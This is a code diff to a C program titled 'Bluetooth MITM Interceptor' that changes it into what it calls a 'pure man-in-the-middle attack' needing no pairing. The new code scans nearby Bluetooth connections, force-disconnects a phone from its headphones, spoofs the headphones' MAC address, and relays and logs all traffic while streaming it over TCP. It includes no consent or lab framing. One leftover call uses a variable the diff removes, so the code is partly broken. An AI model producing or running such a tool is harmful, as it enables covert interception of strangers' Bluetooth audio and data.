@@ -18,27 +18,29 @@ void signal_handler(int sig) {
 }
 
 void print_usage(const char *prog_name) {
-    fprintf(stderr, "Bluetooth MITM Interceptor\n\n");
+    fprintf(stderr, "Bluetooth MITM Interceptor - Pure Man-in-the-Middle Attack\n\n");
     fprintf(stderr, "Usage: %s [OPTIONS]\n\n", prog_name);
     fprintf(stderr, "Options:\n");
-    fprintf(stderr, "  -t <target_mac>    Target device MAC (headphones/BT device) [REQUIRED]\n");
+    fprintf(stderr, "  -t <target_mac>    Target device MAC (headphones/BT device)\n");
     fprintf(stderr, "  -p <psm>           L2CAP PSM (default: 25 for A2DP audio)\n");
     fprintf(stderr, "  -P <port>          TCP server port (default: %d)\n", TCP_SERVER_PORT);
-    fprintf(stderr, "  -S                 Interactive mode - select from paired devices\n");
+    fprintf(stderr, "  -S                 Interactive mode - scan and select devices\n");
     fprintf(stderr, "  -h                 Show this help\n");
     fprintf(stderr, "\n");
-    fprintf(stderr, "How it works:\n");
-    fprintf(stderr, "  1. Disconnects target device from current connection\n");
-    fprintf(stderr, "  2. Spoofs target device MAC address\n");
-    fprintf(stderr, "  3. Waits for phone to reconnect\n");
-    fprintf(stderr, "  4. Acts as MITM between phone and real device\n");
-    fprintf(stderr, "  5. Logs all encrypted/decrypted packets\n");
+    fprintf(stderr, "Pure MITM Attack Flow:\n");
+    fprintf(stderr, "  1. Scan for active Bluetooth connections in the area\n");
+    fprintf(stderr, "  2. Force disconnect phone from target device\n");
+    fprintf(stderr, "  3. Spoof target device MAC address\n");
+    fprintf(stderr, "  4. Accept connection from phone (pretending to be target)\n");
+    fprintf(stderr, "  5. Connect to real target device (pretending to be phone)\n");
+    fprintf(stderr, "  6. Log all packets flowing between them\n");
     fprintf(stderr, "\n");
     fprintf(stderr, "Example:\n");
-    fprintf(stderr, "  %s -S              # Interactive mode\n", prog_name);
-    fprintf(stderr, "  %s -t AA:BB:CC:DD:EE:FF\n", prog_name);
+    fprintf(stderr, "  %s -S                      # Interactive mode (recommended)\n", prog_name);
+    fprintf(stderr, "  %s -t AA:BB:CC:DD:EE:FF    # Direct target MAC\n", prog_name);
     fprintf(stderr, "\n");
-    fprintf(stderr, "Note: Target device must be paired with this computer first\n");
+    fprintf(stderr, "Note: This is a pure MITM attack. NO pairing with target required!\n");
+    fprintf(stderr, "      The MITM computer acts as a transparent relay.\n");
 }
 
 void display_devices(bt_device_t *devices, int count) {
@@ -131,61 +133,29 @@ int relay_loop(int phone_sock, int headset_sock, int tcp_server, int tcp_client)
                 return -1;
             }
             
-            INFO_PRINT("📱 PHONE → HEADSET: %zd bytes (encrypted)", bytes);
+            INFO_PRINT("📱 PHONE → TARGET: %zd bytes", bytes);
             
-            // Log first 32 bytes of encrypted data
-            printf("[ENCRYPTED] ");
-            for (int i = 0; i < (bytes < 32 ? bytes : 32); i++) {
+            // Log first 64 bytes of data
+            printf("[PACKET] ");
+            for (int i = 0; i < (bytes < 64 ? bytes : 64); i++) {
                 printf("%02x ", buffer[i]);
             }
-            if (bytes > 32) printf("... (%zd more bytes)", bytes - 32);
-            printf("\n");
+            if (bytes > 64) printf("... (%zd more bytes)", bytes - 64);
+            printf("\n\n");
             
-            uint8_t decrypted[MAX_BUFFER_SIZE];
-            int dec_len = crypto_decrypt_payload(buffer, bytes, decrypted);
-            if (dec_len < 0) {
-                ERROR_PRINT("Decryption failed");
-                continue;
-            }
-            
-            INFO_PRINT("🔓 DECRYPTED: %d bytes", dec_len);
-            
-            // Log first 32 bytes of decrypted data
-            printf("[DECRYPTED] ");
-            for (int i = 0; i < (dec_len < 32 ? dec_len : 32); i++) {
-                printf("%02x ", decrypted[i]);
-            }
-            if (dec_len > 32) printf("... (%d more bytes)", dec_len - 32);
-            printf("\n");
-            
+            // Forward to TCP client if connected
             if (tcp_client >= 0) {
-                if (tcp_send_data(tcp_client, decrypted, dec_len) < 0) {
-                    INFO_PRINT("TCP client disconnected, closing connection");
+                if (tcp_send_data(tcp_client, buffer, bytes) < 0) {
+                    INFO_PRINT("TCP client disconnected");
                     close(tcp_client);
                     tcp_client = -1;
                 }
             }
             
-            uint8_t encrypted[MAX_BUFFER_SIZE];
-            int enc_len = crypto_encrypt_payload(decrypted, dec_len, encrypted);
-            if (enc_len < 0) {
-                ERROR_PRINT("Encryption failed");
-                continue;
-            }
-            
-            INFO_PRINT("🔒 RE-ENCRYPTED: %d bytes", enc_len);
-            
-            // Log first 32 bytes of re-encrypted data
-            printf("[RE-ENCRYPTED] ");
-            for (int i = 0; i < (enc_len < 32 ? enc_len : 32); i++) {
-                printf("%02x ", encrypted[i]);
-            }
-            if (enc_len > 32) printf("... (%d more bytes)", enc_len - 32);
-            printf("\n\n");
-            
-            ssize_t sent = send(headset_sock, encrypted, enc_len, 0);
+            // Forward directly to headset (no decryption/re-encryption)
+            ssize_t sent = send(headset_sock, buffer, bytes, 0);
             if (sent < 0) {
-                ERROR_PRINT("Failed to send to headset");
+                ERROR_PRINT("Failed to send to target device");
                 return -1;
             }
         }
@@ -194,23 +164,24 @@ int relay_loop(int phone_sock, int headset_sock, int tcp_server, int tcp_client)
             ssize_t bytes = recv(headset_sock, buffer, sizeof(buffer), 0);
             if (bytes <= 0) {
                 if (bytes == 0) {
-                    INFO_PRINT("Headset disconnected");
+                    INFO_PRINT("Target device disconnected");
                 } else {
-                    ERROR_PRINT("Error reading from headset");
+                    ERROR_PRINT("Error reading from target device");
                 }
                 return -1;
             }
             
-            INFO_PRINT("🎧 HEADSET → PHONE: %zd bytes (control/response)", bytes);
+            INFO_PRINT("🎧 TARGET → PHONE: %zd bytes", bytes);
             
-            // Log first 32 bytes of data
-            printf("[HEADSET DATA] ");
-            for (int i = 0; i < (bytes < 32 ? bytes : 32); i++) {
+            // Log first 64 bytes of data
+            printf("[PACKET] ");
+            for (int i = 0; i < (bytes < 64 ? bytes : 64); i++) {
                 printf("%02x ", buffer[i]);
             }
-            if (bytes > 32) printf("... (%zd more bytes)", bytes - 32);
+            if (bytes > 64) printf("... (%zd more bytes)", bytes - 64);
             printf("\n\n");
             
+            // Forward back to phone
             ssize_t sent = send(phone_sock, buffer, bytes, 0);
             if (sent < 0) {
                 ERROR_PRINT("Failed to send to phone");
@@ -258,31 +229,41 @@ int main(int argc, char *argv[]) {
         int device_count;
         char target_selected[18] = {0};
         
-        INFO_PRINT("=== Bluetooth MITM Interceptor ===");
-        INFO_PRINT("Automatic MITM attack on connected Bluetooth devices");
+        INFO_PRINT("═══════════════════════════════════════════════════════");
+        INFO_PRINT("   Bluetooth MITM Interceptor - Discovery Mode");
+        INFO_PRINT("═══════════════════════════════════════════════════════");
+        INFO_PRINT("");
+        INFO_PRINT("This tool will:");
+        INFO_PRINT("  1. Scan for active Bluetooth connections");
+        INFO_PRINT("  2. Force disconnect the target device");
+        INFO_PRINT("  3. Spoof target's MAC and intercept reconnection");
+        INFO_PRINT("  4. Act as MITM and log all packets");
+        INFO_PRINT("");
+        INFO_PRINT("═══════════════════════════════════════════════════════");
         printf("\n");
         
-        INFO_PRINT("Listing devices paired with this computer...");
+        INFO_PRINT("Scanning for Bluetooth devices and active connections...");
         printf("\n");
         
-        device_count = bt_scan_devices(devices, 50, 8);
+        device_count = bt_scan_active_connections(devices, 50);
         if (device_count <= 0) {
-            ERROR_PRINT("No paired devices found");
+            ERROR_PRINT("No Bluetooth devices found in the area");
             INFO_PRINT("");
-            INFO_PRINT("Please pair the target device (headphones) with this computer:");
-            INFO_PRINT("  sudo bluetoothctl");
-            INFO_PRINT("  power on");
-            INFO_PRINT("  scan on");
-            INFO_PRINT("  pair <DEVICE_MAC>");
-            INFO_PRINT("  trust <DEVICE_MAC>");
-            INFO_PRINT("  quit");
+            INFO_PRINT("Make sure:");
+            INFO_PRINT("  - Target devices (phone + headphones) are nearby");
+            INFO_PRINT("  - They are currently connected to each other");
+            INFO_PRINT("  - Bluetooth adapter is powered on");
             return 1;
         }
         
         display_devices(devices, device_count);
         
         if (!target_mac) {
-            char *selected = select_device(devices, device_count, "Select target device to intercept");
+            INFO_PRINT("Select the TARGET device to intercept (usually headphones):");
+            INFO_PRINT("This is the device the phone is connected to.");
+            printf("\n");
+            
+            char *selected = select_device(devices, device_count, "Select target device");
             if (selected == NULL) {
                 ERROR_PRINT("No device selected");
                 return 1;
@@ -291,7 +272,7 @@ int main(int argc, char *argv[]) {
             target_mac = target_selected;
         }
         
-        INFO_PRINT("✓ Target device: %s", target_mac);
+        INFO_PRINT("✓ Target device selected: %s", target_mac);
         printf("\n");
     }
     
@@ -305,7 +286,7 @@ int main(int argc, char *argv[]) {
     signal(SIGTERM, signal_handler);
     
     INFO_PRINT("═══════════════════════════════════════════════════════");
-    INFO_PRINT("   Bluetooth MITM Interceptor - Active Mode");
+    INFO_PRINT("   Bluetooth MITM Attack - Active Mode");
     INFO_PRINT("═══════════════════════════════════════════════════════");
     INFO_PRINT("Target device:  %s", target_mac);
     INFO_PRINT("L2CAP PSM:      %d", psm);
@@ -317,68 +298,74 @@ int main(int argc, char *argv[]) {
     if (bt_get_adapter_address(adapter_mac, sizeof(adapter_mac)) < 0) {
         return 1;
     }
+    INFO_PRINT("MITM adapter MAC: %s", adapter_mac);
+    printf("\n");
     
     INFO_PRINT("MITM Attack Sequence Starting...");
     printf("\n");
     
-    INFO_PRINT("Step 1: Disconnect target device from current connection");
+    INFO_PRINT("Step 1: Force disconnect target device from current connection");
     int target_connected = bt_check_connection_status(target_mac);
     
     if (target_connected) {
-        INFO_PRINT("⚠️  Target device is CONNECTED - disconnecting now");
+        INFO_PRINT("⚠️  Target device is CONNECTED - forcing disconnect");
         
+        // Try multiple disconnection methods
         if (bt_disconnect_device(target_mac) < 0) {
-            WARN_PRINT("Automatic disconnect failed");
-            INFO_PRINT("Please manually disconnect the device:");
-            INFO_PRINT("  - Turn off Bluetooth on phone, OR");
-            INFO_PRINT("  - Disconnect in Bluetooth settings, OR");
-            INFO_PRINT("  - Turn off headphones and back on");
+            WARN_PRINT("Standard disconnect failed, trying aggressive methods...");
+            
+            // Try hcitool disconnect
+            char cmd[256];
+            snprintf(cmd, sizeof(cmd), "hcitool dc %s 2>&1", target_mac);
+            system(cmd);
+            sleep(1);
+        }
+        
+        // Verify disconnection
+        sleep(2);
+        if (bt_check_connection_status(target_mac)) {
+            ERROR_PRINT("Could not disconnect target device");
+            INFO_PRINT("");
+            INFO_PRINT("Please manually disconnect:");
+            INFO_PRINT("  - Turn off target device, OR");
+            INFO_PRINT("  - Disconnect from phone's Bluetooth settings");
+            INFO_PRINT("");
             INFO_PRINT("Press Enter when disconnected...");
             getchar();
         } else {
             INFO_PRINT("✓ Target device disconnected");
-            sleep(2);
         }
     } else {
         INFO_PRINT("✓ Target device is already disconnected");
     }
     printf("\n");
     
-    INFO_PRINT("Step 2: Extract link key from paired target device");
-    char link_key[64];
-    if (bt_extract_link_key(adapter_mac, target_mac, link_key, sizeof(link_key)) < 0) {
-        ERROR_PRINT("Failed to extract link key");
-        ERROR_PRINT("Ensure target device is paired: %s/%s/%s/info", 
-                   BLUETOOTH_INFO_PATH, adapter_mac, target_mac);
-        return 1;
-    }
-    INFO_PRINT("✓ Link key extracted");
-    printf("\n");
+    INFO_PRINT("Step 2: Spoof target device MAC address");
+    INFO_PRINT("Changing MITM adapter MAC to: %s", target_mac);
     
-    INFO_PRINT("Step 3: Initialize encryption");
-    if (crypto_init_link_key(link_key) < 0) {
-        return 1;
-    }
-    INFO_PRINT("✓ Encryption ready");
-    printf("\n");
-    
-    INFO_PRINT("Step 4: Spoof target device MAC address");
-    INFO_PRINT("Changing adapter MAC to: %s", target_mac);
     if (bt_spoof_mac_address(0, target_mac) < 0) {
-        WARN_PRINT("MAC spoofing failed - MITM may not work properly");
-        INFO_PRINT("You may need to manually spoof MAC using:");
+        ERROR_PRINT("MAC spoofing failed");
+        INFO_PRINT("");
+        INFO_PRINT("Manual MAC spoofing required:");
         INFO_PRINT("  sudo hciconfig hci0 down");
         INFO_PRINT("  sudo bdaddr -i hci0 %s", target_mac);
         INFO_PRINT("  sudo hciconfig hci0 up");
-        INFO_PRINT("Press Enter to continue anyway...");
+        INFO_PRINT("");
+        INFO_PRINT("Press Enter when MAC is spoofed...");
         getchar();
     } else {
-        INFO_PRINT("✓ MAC address spoofed");
-        sleep(1);
+        INFO_PRINT("✓ MAC address spoofed successfully");
+        sleep(2);
     }
     printf("\n");
     
-    INFO_PRINT("Step 5: Create TCP server for data streaming");
+    INFO_PRINT("Step 3: Make MITM adapter discoverable as target device");
+    system("hciconfig hci0 piscan 2>&1");
+    system("bluetoothctl discoverable on 2>&1 > /dev/null &");
+    INFO_PRINT("✓ MITM adapter is now discoverable as %s", target_mac);
+    printf("\n");
+    
+    INFO_PRINT("Step 4: Create TCP server for data streaming");
     
     if (crypto_init_link_key(link_key) < 0) {
         return 1;
@@ -395,16 +382,18 @@ int main(int argc, char *argv[]) {
     INFO_PRINT("✓ TCP server listening on port %d", tcp_port);
     printf("\n");
     
-    INFO_PRINT("Step 6: Setup Bluetooth relay sockets");
+    INFO_PRINT("Step 5: Setup Bluetooth relay - Wait for phone to connect");
     INFO_PRINT("═══════════════════════════════════════════════════════");
     INFO_PRINT("   MITM READY - Waiting for connections");
     INFO_PRINT("═══════════════════════════════════════════════════════");
     INFO_PRINT("");
-    INFO_PRINT("Now RECONNECT the phone to headphones:");
-    INFO_PRINT("  1. On phone: Go to Bluetooth settings");
-    INFO_PRINT("  2. Tap on the headphones device to connect");
-    INFO_PRINT("  3. Phone will connect to THIS interceptor (spoofed)");
-    INFO_PRINT("  4. Interceptor will connect to real headphones");
+    INFO_PRINT("The MITM is now pretending to be: %s", target_mac);
+    INFO_PRINT("");
+    INFO_PRINT("Next steps:");
+    INFO_PRINT("  1. Phone will try to reconnect automatically, OR");
+    INFO_PRINT("  2. Manually reconnect from phone's Bluetooth settings");
+    INFO_PRINT("  3. Phone connects to MITM (thinks it's the headphones)");
+    INFO_PRINT("  4. MITM will then connect to real headphones");
     INFO_PRINT("  5. All packets will be logged below");
     INFO_PRINT("");
     INFO_PRINT("═══════════════════════════════════════════════════════");
@@ -418,6 +407,7 @@ int main(int argc, char *argv[]) {
     }
     
     // Bind as the spoofed target device (headphones)
+    INFO_PRINT("Binding to L2CAP PSM %d as spoofed device...", psm);
     if (bt_bind_l2cap(phone_sock, NULL, psm) < 0) {
         close(phone_sock);
         close(tcp_server);
@@ -430,24 +420,38 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    INFO_PRINT("Waiting for phone to connect (as spoofed %s)...", target_mac);
+    INFO_PRINT("✓ Listening for incoming connection from phone...");
+    INFO_PRINT("Waiting for phone to connect (timeout: 60 seconds)...");
+    printf("\n");
+    
+    // Set timeout for accept
+    struct timeval tv;
+    tv.tv_sec = 60;
+    tv.tv_usec = 0;
+    setsockopt(phone_sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
+    
     char phone_addr[18];
     int phone_conn = bt_accept_l2cap(phone_sock, phone_addr, sizeof(phone_addr));
     if (phone_conn < 0) {
+        ERROR_PRINT("Phone did not connect within timeout");
+        INFO_PRINT("Make sure phone is trying to connect to the headphones");
         close(phone_sock);
         close(tcp_server);
         return 1;
     }
     
-    INFO_PRINT("✓ Phone connected from: %s", phone_addr);
-    INFO_PRINT("Now connecting to real headphones (%s)...", target_mac);
+    INFO_PRINT("✓✓✓ PHONE CONNECTED ✓✓✓");
+    INFO_PRINT("Source device (phone): %s", phone_addr);
+    printf("\n");
     
-    // Connect to real headphones (un-spoof first or use different adapter)
-    // For now, we'll restore the original MAC and connect
-    INFO_PRINT("Restoring original adapter MAC...");
+    INFO_PRINT("Step 6: Connect to real target device (headphones)");
+    INFO_PRINT("Restoring original adapter MAC: %s", adapter_mac);
+    
+    // Restore original MAC to connect to real headphones
     bt_spoof_mac_address(0, adapter_mac);
     sleep(1);
     
+    INFO_PRINT("Connecting to real target device: %s", target_mac);
     int headset_sock = bt_create_l2cap_socket();
     if (headset_sock < 0) {
         close(phone_conn);
@@ -457,7 +461,8 @@ int main(int argc, char *argv[]) {
     }
     
     if (bt_connect_l2cap(headset_sock, target_mac, psm) < 0) {
-        ERROR_PRINT("Failed to connect to real headphones");
+        ERROR_PRINT("Failed to connect to real target device");
+        ERROR_PRINT("Make sure target device is powered on and in range");
         close(headset_sock);
         close(phone_conn);
         close(phone_sock);
@@ -465,10 +470,12 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    INFO_PRINT("✓ Connected to real headphones");
+    INFO_PRINT("✓✓✓ CONNECTED TO REAL DEVICE ✓✓✓");
     INFO_PRINT("");
     INFO_PRINT("═══════════════════════════════════════════════════════");
     INFO_PRINT("   MITM ACTIVE - Logging all packets");
+    INFO_PRINT("═══════════════════════════════════════════════════════");
+    INFO_PRINT("Phone (%s) → MITM → Target (%s)", phone_addr, target_mac);
     INFO_PRINT("═══════════════════════════════════════════════════════");
     printf("\n");
     
